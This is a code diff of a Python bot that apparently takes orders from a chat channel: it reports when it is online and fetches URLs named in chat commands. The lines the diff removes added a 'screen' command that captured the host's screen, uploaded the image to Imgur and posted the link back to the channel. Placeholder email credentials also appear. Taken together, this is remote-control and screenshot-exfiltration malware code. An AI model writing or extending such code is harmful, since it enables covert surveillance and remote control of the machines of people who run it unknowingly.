@@ -19,7 +19,7 @@ EMAIL= 'default@mail.com'
 EPASS = 'root'
 EPORT = 465  # For SSL
 smtp_server = "smtp.gmail.com"
-CLIENT_ID = "put id here"
+CLIENT_ID = "client id"
 
 def send_mail(receiver, subject, content):
     context = ssl.create_default_context()
@@ -50,6 +50,7 @@ def main():
             #Legacy but possible use in only allowing one user to issue commands
             #username = re.search(r"\w+", response).group(0)
             message = CHAT_MSG.sub("", response)
+            print(message)
             if message == "!list\r\n":
                 chat(s, clientName + " is online.")
             elif message.startswith('!act'):
@@ -75,18 +76,6 @@ def main():
                         try:
                             urllib.request.urlopen(messageArray[3])
                             chat(s, clientName + " completed the command.")
-                        except Exception as e:
-                            chat(s, clientName + " encountered an error. " + str(e))
-                    elif messageArray[2] == 'screen':
-                        try:
-                            path = os.path.expanduser("~") + "/Downloads/sc.png"
-                            if __name__ == '__main__':
-                                screenshot.grab_to_file(path)
-                            im = pyimgur.Imgur(CLIENT_ID)
-                            uploaded_image = im.upload_image(path, title="Test")
-                            uploaded = uploaded_image.link
-                            os.remove(path)
-                            chat(s, clientName + " completed the command. It is located at " + str(uploaded))
                         except Exception as e:
                             chat(s, clientName + " encountered an error. " + str(e))
                     else:
